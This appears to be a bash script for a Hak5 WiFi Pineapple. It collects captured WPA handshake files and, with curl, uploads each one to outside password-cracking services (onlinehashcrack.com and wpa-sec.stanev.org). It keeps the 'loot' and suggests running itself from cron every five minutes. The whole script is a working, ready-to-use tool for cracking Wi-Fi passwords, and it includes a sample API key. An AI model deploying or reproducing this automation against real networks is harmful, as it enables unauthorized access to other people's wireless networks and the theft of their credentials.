#!/bin/bash
# sailboat-anon | fairwinds! | https://github.com/sailboat-anon/wifi-pineapple-mark-vii
# hak5 wifi pineapple | loot-n-scoot.sh (formerly ohc-api.sh) | tested on mk 7 
# auto-submit captured WPA handshakes (.pcap) to onlinehashcrack.com & wpa-sec.stanev.org, receive email upon completion | persistent handshake loot 

# wpasec_key is generated here:  https://wpa-sec.stanev.org/?get_key
# chmod +x loot-n-scoot.sh
# ./loot-n-scoot.sh -e <your@emailaddress.com | ENV_VAR_EMAIL> -k <your_wpa_sec_key | ENV_VAR_WPASEC_KEY>
# ./loot-n-scoot.sh -e sailboat@marina-network.local -k 906ea9affd7e10a19af871a8592c8ae0

# workflow:
# handshakes (if they exist) moved from /tmp to /root/loot/handshakes
# handshakes sent to the onlinehashcrack.com api, user receives an email confirmation and upon completion
# handshakes sent to wpa-sec.stanev.org, user receives an email upon completion (status: wpa-sec.stanev.org/?my_nets)

# submitted handshakes in /root/loot/handshakes are renamed 'submitted-<formername>.pcap'
# transaction logs: /root/loot/handshakes/logs
# persistent handshake loot: /root/loot/handshakes

# uncomment and cusotomize the next 2 lines to bypass the -e and -k flags
# email=sailboat@marina-network.local
# wpasec_key=906ea9affd7e10a19af871a8592c8ae0

# run it on cron (5 min):
# */5 * * * * /root/loot-n-scoot.sh 

cat <<EOF
                .'|     .8
               .  |    .8:
              .   |   .8;:        .8
             .    |  .8;;:    |  .8;
            .     n .8;;;:    | .8;;;
           .      M.8;;;;;:   |,8;;;;;
          .    .,"n8;;;;;;:   |8;;;;;;
         .   .',  n;;;;;;;:   M;;;;;;;;
        .  ,' ,   n;;;SBA;;:  n;;;;;;;;;
       . ,'  ,    N;;;;;;;;:  n;;;;;;;;;
      . '   ,     N;;;;;;;;;: N;;;;;;;;;;
     .,'   .      N;;;;;;;;;: N;;;;;;;;;;
    ..    ,       N6666666666 N6666666666
    I    ,        M           M
   ---nnnnn_______M___________M______mmnnn
         "-.                          /
  __________"-_______________________/_________
EOF
echo "              GA2 - sailboat-anon@gh";
echo " _             _                                        _         _     
| | ___   ___ | |_      _ __        ___  ___ ___   ___ | |_   ___| |__  
| |/ _ \ / _ \| __|____| '_ \ _____/ __|/ __/ _ \ / _ \| __| / __| '_ \ 
| | (_) | (_) | ||_____| | | |_____\__ \ (_| (_) | (_) | |_ _\__ \ | | |
|_|\___/ \___/ \__|    |_| |_|     |___/\___\___/ \___/ \__(_)___/_| |_|";

while getopts e:k: flag
do
    case "${flag}" in
        e) email=${OPTARG};;
        k) wpasec_key=${OPTARG};;
    esac

if [ -z "$email" ] || [ -z "$wpasec_key" ]
then
   echo "Syntax:";
   echo "    ./loot-n-scoot.sh -e <your@emailaddress.com | ENV_VAR_EMAIL> -k <your_wpa_sec_key | ENV_VAR_WPASEC_KEY>";
   echo "Examples:";
   echo "    1) ./loot-n-scoot.sh -e sailboat@marina-network.local -k 906ea9affd7e10a19af871a8592c8aen ";
   echo "    2) export email=sailboat@marina-network.local; export wpasec_key=906ea9affd7e10a19af871a8592c8aen; bash loot-n-scoot.sh";
fi

echo "> See /root/loot/handshakes/logs for submission logs"
echo "> ----------------------------"
# setup our directories
if [ ! -d "/root/loot/handshakes" ]; then
  mkdir -p /root/loot/handshakes
fi
if [ ! -d "/root/loot/handshakes/logs" ]; then
  mkdir -p /root/loot/handshakes/logs
fi

# get all current-state, unsubmitted handshakes
echo "> Checking for unsubmitted handshakes"
if [ -d "/tmp/handshakes" ]; then
  ls /tmp/handshakes/*.pcap | grep -v "submitted*" > /tmp/ls-handshake.out
fi

if [ ! -s /tmp/ls-handshake.out ]
 then
	echo "> Unsubmitted handshakes NOT FOUND, exiting gracefully" 
    exit
fi

# we have found current-state, unsubmitted handshakes; let's submit them
echo "> Unsubmitted handshakes FOUND, uploading to api.onlinehashcrack.com"
cp *.pcap -au /tmp/handshakes /root/loot
now=$(date +%s)
while IFS= read -r line; 
  do 
    curl -X POST -F "email=${email}" -F "file=@/root/loot/handshakes/${line}" https://api.onlinehashcrack.com; 
    echo "> Submitted (${line}) to onlinehashcrack.com";
    curl -X POST -F "webfile=@/root/loot/handshakes/${line}" --cookie "key=${wpasec_key}" https://wpa-sec.stanev.org/\?submit;
    echo "> Submitted (${line}) to wpa-sec.stanev.org";
done < /tmp/ls-handshake.out >> /root/loot/handshakes/logs/submitted-${now}.txt;

echo "Cleaning up..."
while IFS= read -r line; do mv "/tmp/handshakes/${line}" "/tmp/handshakes/submitted-${line}"; mv "/root/loot/handshakes/${line}" "/root/loot/handshakes/submitted-{$line}"; done < /tmp/ls-handshake.out;
rm /tmp/ls-handshake.out

echo "Output:"
cat /root/loot/handshakes/logs/submitted-${now}.txt
